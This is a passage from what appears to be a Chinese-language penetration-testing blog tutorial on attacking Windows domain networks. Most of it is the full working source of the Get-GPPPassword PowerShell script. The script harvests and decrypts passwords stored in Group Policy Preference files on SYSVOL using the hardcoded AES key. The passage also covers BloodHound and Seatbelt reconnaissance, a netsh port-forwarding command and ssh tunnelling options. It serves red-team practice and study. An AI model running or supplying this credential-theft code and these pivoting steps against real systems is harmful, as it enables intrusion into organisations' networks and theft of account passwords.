[BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:28:53&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password12&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;test1&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\DataSources\DataSources.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : &#123;mspresenters&#125;</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;Recycling*3ftw!, password123, password1234&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;Administrator (built-in), DummyAccount, dummy2&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\Groups.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:29:53, 2014-02-21 05:29:52&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password, password1234$&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;administrator, admin&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:30:14, 2014-02-21 05:30:36&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password, read123&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;DEMO\Administrator, admin&#125;</span></span><br><span class="line"><span class="comment">    File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Services\Services.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword -Server EXAMPLE.COM</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : [BLANK]</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2014-02-21 05:28:53&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;password12&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;test1&#125;</span></span><br><span class="line"><span class="comment">    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB982DA&#125;\MACHINE\Preferences\DataSources\DataSources.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    NewName   : &#123;mspresenters&#125;</span></span><br><span class="line"><span class="comment">    Changed   : &#123;2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48&#125;</span></span><br><span class="line"><span class="comment">    Passwords : &#123;Recycling*3ftw!, password123, password1234&#125;</span></span><br><span class="line"><span class="comment">    UserNames : &#123;Administrator (built-in), DummyAccount, dummy2&#125;</span></span><br><span class="line"><span class="comment">    File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB9AB12&#125;\MACHINE\Preferences\Groups\Groups.xml</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    PS C:\&gt; Get-GPPPassword | ForEach-Object &#123;$_.passwords&#125; | Sort-Object -Uniq</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    password</span></span><br><span class="line"><span class="comment">    password12</span></span><br><span class="line"><span class="comment">    password123</span></span><br><span class="line"><span class="comment">    password1234</span></span><br><span class="line"><span class="comment">    password1234$</span></span><br><span class="line"><span class="comment">    read123</span></span><br><span class="line"><span class="comment">    Recycling*3ftw!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"><span class="doctag">.LINK</span></span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html</span></span><br><span class="line"><span class="comment">    https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1</span></span><br><span class="line"><span class="comment">    http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences</span></span><br><span class="line"><span class="comment">    http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line">    </span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">    <span class="keyword">Param</span> (</span><br><span class="line">            [<span class="type">ValidateNotNullOrEmpty</span>()]</span><br><span class="line">            [<span class="built_in">String</span>]</span><br><span class="line">            <span class="variable">$Server</span> = <span class="variable">$Env:USERDNSDOMAIN</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Some XML issues between versions</span></span><br><span class="line">    <span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#define helper function that decodes and decrypts password</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-DecryptedCpassword</span></span> &#123;</span><br><span class="line">        [<span class="type">CmdletBinding</span>()]</span><br><span class="line">        <span class="keyword">Param</span> (</span><br><span class="line">            [<span class="built_in">string</span>] <span class="variable">$Cpassword</span> </span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">#Append appropriate padding based on string length  </span></span><br><span class="line">            <span class="variable">$Mod</span> = (<span class="variable">$Cpassword</span>.length % <span class="number">4</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$Mod</span>) &#123;</span><br><span class="line">            <span class="string">&#x27;1&#x27;</span> &#123;<span class="variable">$Cpassword</span> = <span class="variable">$Cpassword</span>.Substring(<span class="number">0</span>,<span class="variable">$Cpassword</span>.Length <span class="literal">-1</span>)&#125;</span><br><span class="line">            <span class="string">&#x27;2&#x27;</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">            <span class="string">&#x27;3&#x27;</span> &#123;<span class="variable">$Cpassword</span> += (<span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - <span class="variable">$Mod</span>))&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$Base64Decoded</span> = [<span class="type">Convert</span>]::FromBase64String(<span class="variable">$Cpassword</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#Create a new AES .NET Crypto Object</span></span><br><span class="line">            <span class="variable">$AesObject</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.AesCryptoServiceProvider</span><br><span class="line">            [<span class="built_in">Byte</span>[]] <span class="variable">$AesKey</span> = <span class="selector-tag">@</span>(<span class="number">0</span>x4e,<span class="number">0</span>x99,<span class="number">0</span>x06,<span class="number">0</span>xe8,<span class="number">0</span>xfc,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>xc9,<span class="number">0</span>xfa,<span class="number">0</span>xf4,<span class="number">0</span>x93,<span class="number">0</span>x10,<span class="number">0</span>x62,<span class="number">0</span>x0f,<span class="number">0</span>xfe,<span class="number">0</span>xe8,</span><br><span class="line">                                 <span class="number">0</span>xf4,<span class="number">0</span>x96,<span class="number">0</span>xe8,<span class="number">0</span>x06,<span class="number">0</span>xcc,<span class="number">0</span>x05,<span class="number">0</span>x79,<span class="number">0</span>x90,<span class="number">0</span>x20,<span class="number">0</span>x9b,<span class="number">0</span>x09,<span class="number">0</span>xa4,<span class="number">0</span>x33,<span class="number">0</span>xb6,<span class="number">0</span>x6c,<span class="number">0</span>x1b)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#Set IV to all nulls to prevent dynamic generation of IV value</span></span><br><span class="line">            <span class="variable">$AesIV</span> = <span class="built_in">New-Object</span> Byte[](<span class="variable">$AesObject</span>.IV.Length) </span><br><span class="line">            <span class="variable">$AesObject</span>.IV = <span class="variable">$AesIV</span></span><br><span class="line">            <span class="variable">$AesObject</span>.Key = <span class="variable">$AesKey</span></span><br><span class="line">            <span class="variable">$DecryptorObject</span> = <span class="variable">$AesObject</span>.CreateDecryptor() </span><br><span class="line">            [<span class="built_in">Byte</span>[]] <span class="variable">$OutBlock</span> = <span class="variable">$DecryptorObject</span>.TransformFinalBlock(<span class="variable">$Base64Decoded</span>, <span class="number">0</span>, <span class="variable">$Base64Decoded</span>.length)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> [<span class="type">System.Text.UnicodeEncoding</span>]::Unicode.GetString(<span class="variable">$OutBlock</span>)</span><br><span class="line">        &#125; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#define helper function to parse fields from xml files</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Get-GPPInnerFields</span></span> &#123;</span><br><span class="line">    [<span class="type">CmdletBinding</span>()]</span><br><span class="line">        <span class="keyword">Param</span> (</span><br><span class="line">            <span class="variable">$File</span></span><br><span class="line">        )</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="variable">$Filename</span> = <span class="built_in">Split-Path</span> <span class="variable">$File</span> <span class="literal">-Leaf</span></span><br><span class="line">            [<span class="built_in">xml</span>] <span class="variable">$Xml</span> = <span class="built_in">Get-Content</span> (<span class="variable">$File</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#declare empty arrays</span></span><br><span class="line">            <span class="variable">$Cpassword</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$UserName</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$NewName</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$Changed</span> = <span class="selector-tag">@</span>()</span><br><span class="line">            <span class="variable">$Password</span> = <span class="selector-tag">@</span>()</span><br><span class="line">    </span><br><span class="line">            <span class="comment">#check for password field</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$Xml</span>.innerxml <span class="operator">-like</span> <span class="string">&quot;*cpassword*&quot;</span>)&#123;</span><br><span class="line">            </span><br><span class="line">                <span class="built_in">Write-Verbose</span> <span class="string">&quot;Potential password in <span class="variable">$File</span>&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$Filename</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="string">&#x27;Groups.xml&#x27;</span> &#123;</span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@userName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$NewName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/Properties/@newName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Groups/User/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;Services.xml&#x27;</span> &#123;  </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/Properties/@accountName&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/NTServices/NTService/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;Scheduledtasks.xml&#x27;</span> &#123;</span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/Properties/@runAs&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/ScheduledTasks/Task/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">        </span><br><span class="line">                    <span class="string">&#x27;DataSources.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/DataSources/DataSource/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;                          </span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line">                    <span class="string">&#x27;Printers.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Printers/SharedPrinter/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">  </span><br><span class="line">                    <span class="string">&#x27;Drives.xml&#x27;</span> &#123; </span><br><span class="line">                        <span class="variable">$Cpassword</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/Properties/@cpassword&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$UserName</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/Properties/@username&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125;</span><br><span class="line">                        <span class="variable">$Changed</span> += , <span class="variable">$Xml</span> | <span class="built_in">Select-Xml</span> <span class="string">&quot;/Drives/Drive/@changed&quot;</span> | <span class="built_in">Select-Object</span> <span class="literal">-Expand</span> Node | <span class="built_in">ForEach-Object</span> &#123;<span class="variable">$_</span>.Value&#125; </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">           &#125;</span><br><span class="line">                     </span><br><span class="line">           <span class="keyword">foreach</span> (<span class="variable">$Pass</span> <span class="keyword">in</span> <span class="variable">$Cpassword</span>) &#123;</span><br><span class="line">               <span class="built_in">Write-Verbose</span> <span class="string">&quot;Decrypting <span class="variable">$Pass</span>&quot;</span></span><br><span class="line">               <span class="variable">$DecryptedPassword</span> = <span class="built_in">Get-DecryptedCpassword</span> <span class="variable">$Pass</span></span><br><span class="line">               <span class="built_in">Write-Verbose</span> <span class="string">&quot;Decrypted a password of <span class="variable">$DecryptedPassword</span>&quot;</span></span><br><span class="line">               <span class="comment">#append any new passwords to array</span></span><br><span class="line">               <span class="variable">$Password</span> += , <span class="variable">$DecryptedPassword</span></span><br><span class="line">           &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#put [BLANK] in variables</span></span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$Password</span>)) &#123;<span class="variable">$Password</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$UserName</span>)) &#123;<span class="variable">$UserName</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$Changed</span>)) &#123;<span class="variable">$Changed</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">if</span> (!(<span class="variable">$NewName</span>)) &#123;<span class="variable">$NewName</span> = <span class="string">&#x27;[BLANK]&#x27;</span>&#125;</span><br><span class="line">                  </span><br><span class="line">            <span class="comment">#Create custom object to output results</span></span><br><span class="line">            <span class="variable">$ObjectProperties</span> = <span class="selector-tag">@</span>&#123;<span class="string">&#x27;Passwords&#x27;</span> = <span class="variable">$Password</span>;</span><br><span class="line">                                  <span class="string">&#x27;UserNames&#x27;</span> = <span class="variable">$UserName</span>;</span><br><span class="line">                                  <span class="string">&#x27;Changed&#x27;</span> = <span class="variable">$Changed</span>;</span><br><span class="line">                                  <span class="string">&#x27;NewName&#x27;</span> = <span class="variable">$NewName</span>;</span><br><span class="line">                                  <span class="string">&#x27;File&#x27;</span> = <span class="variable">$File</span>&#125;</span><br><span class="line">                </span><br><span class="line">            <span class="variable">$ResultsObject</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> PSObject <span class="literal">-Property</span> <span class="variable">$ObjectProperties</span></span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;The password is between &#123;&#125; and may be more than one value.&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$ResultsObject</span>) &#123;<span class="keyword">Return</span> <span class="variable">$ResultsObject</span>&#125; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">#ensure that machine is domain joined and script is running as a domain account</span></span><br><span class="line">        <span class="keyword">if</span> ( ( ((<span class="built_in">Get-WmiObject</span> Win32_ComputerSystem).partofdomain) <span class="operator">-eq</span> <span class="variable">$False</span> ) <span class="operator">-or</span> ( <span class="operator">-not</span> <span class="variable">$Env:USERDNSDOMAIN</span> ) ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">&#x27;Machine is not a domain member or User is not a member of the domain.&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#discover potential files containing passwords ; not complaining in case of denied access to a directory</span></span><br><span class="line">        <span class="built_in">Write-Verbose</span> <span class="string">&quot;Searching \\<span class="variable">$Server</span>\SYSVOL. This could take a while.&quot;</span></span><br><span class="line">        <span class="variable">$XMlFiles</span> = <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&quot;\\<span class="variable">$Server</span>\SYSVOL&quot;</span> <span class="literal">-Recurse</span> <span class="literal">-ErrorAction</span> SilentlyContinue <span class="literal">-Include</span> <span class="string">&#x27;Groups.xml&#x27;</span>,<span class="string">&#x27;Services.xml&#x27;</span>,<span class="string">&#x27;Scheduledtasks.xml&#x27;</span>,<span class="string">&#x27;DataSources.xml&#x27;</span>,<span class="string">&#x27;Printers.xml&#x27;</span>,<span class="string">&#x27;Drives.xml&#x27;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> ( <span class="operator">-not</span> <span class="variable">$XMlFiles</span> ) &#123;<span class="keyword">throw</span> <span class="string">&#x27;No preference files found.&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Write-Verbose</span> <span class="string">&quot;Found <span class="variable">$</span>(<span class="variable">$XMLFiles</span> | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords.&quot;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$File</span> <span class="keyword">in</span> <span class="variable">$XMLFiles</span>) &#123;</span><br><span class="line">            <span class="variable">$Result</span> = (<span class="built_in">Get-GppInnerFields</span> <span class="variable">$File</span>.Fullname)</span><br><span class="line">            <span class="built_in">Write-Output</span> <span class="variable">$Result</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">catch</span> &#123;<span class="built_in">Write-Error</span> <span class="variable">$Error</span>[<span class="number">0</span>]&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h3><p>这个工具能做一些自动化的信息收集，收集的信息很多，包括不限于google历史记录、用户等等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#项目地址</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;GhostPack&#x2F;Seatbelt</span><br></pre></td></tr></table></figure><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>我们可以利用Bloodhound做一些自动化的信息收集，包括用户、计算机、组织架构、最快的攻击途径等。但是自动化也意味着告警，该漏洞做自动化信息收集时，会在内网设备上产生大量的告警，按需使用。</p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;BloodHoundAD&#x2F;BloodHound</span><br></pre></td></tr></table></figure><p>使用文档直接看这边即可了，我就懒得copy过来了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bloodhound.readthedocs.io&#x2F;</span><br></pre></td></tr></table></figure><p>这里有两个版本，一个PS版本一个exe版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe  -c all</span><br></pre></td></tr></table></figure><p>运行后会在本地生成两个文件</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/46.png" alt="image-20200801121332755"></p><p>接下来要搭个服务器，我们需要如下清单</p><ul><li>neo4j-community-4.1.1-windows</li><li>BloodHound-win32-x64</li><li>JAVA环境（OpenJDK 11）</li></ul><p>搭建步骤跟官方文档走就好了，我这边就用kali搭neo4j服务了，不想破坏windows目前的环境</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/47.png" alt="image-20200801124946426"></p><p>这是连接上了的环境，并且处理了我们先生成的zip格式文件</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/48.png" alt="image-20200801125325408"></p><p>找到域环境管理员最短路径，这工具第一次接触，不敢乱写，后面研究下补充下</p><h2 id="狡兔三窟"><a href="#狡兔三窟" class="headerlink" title="狡兔三窟"></a>狡兔三窟</h2><h3 id="是否出网"><a href="#是否出网" class="headerlink" title="是否出网"></a>是否出网</h3><p>简单的命令如下，复杂点的可以看<a href="https://www.ascotbe.com/2020/07/12/RemoteDownlo">恶意程序研究之远程下载恶意程序</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping</span><br><span class="line">curl</span><br><span class="line">nslookup</span><br></pre></td></tr></table></figure><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><h4 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h4><p>netsh是windows自带的命令，可以允许修改计算机的网络配置。也可以被拿来做端口转发。</p><p>详细内容可以参考官方文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-tw&#x2F;windows-server&#x2F;networking&#x2F;technologies&#x2F;netsh&#x2F;netsh-contexts</span><br></pre></td></tr></table></figure><p>A机器执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh  interface portproxy add v4tov4 listenport&#x3D;5555 connectport&#x3D;3389 connectaddress&#x3D;192.168.1.1  protocol&#x3D;tcp</span><br></pre></td></tr></table></figure><p>B机器访问A机器的5555端口，即是192.168.1.1的3389端口</p><h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p>ssh一般被拿来登录linux机器，也可以拿来做代理和转发。</p><h5 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">-1：强制使用ssh协议版本1.</span><br><span class="line">-2：强制使用ssh协议版本2.</span><br><span class="line">-4：强制使用IPv4地址.</span><br><span class="line">-6：强制使用IPv6地址.</span><br><span class="line">-A：开启认证代理连接转发功能.</span><br><span class="line">-a：关闭认证代理连接转发功能.</span><br><span class="line">-b bind_address</span><br><span class="line">使用本机指定地址作为对应连接的源ip地址.</span><br><span 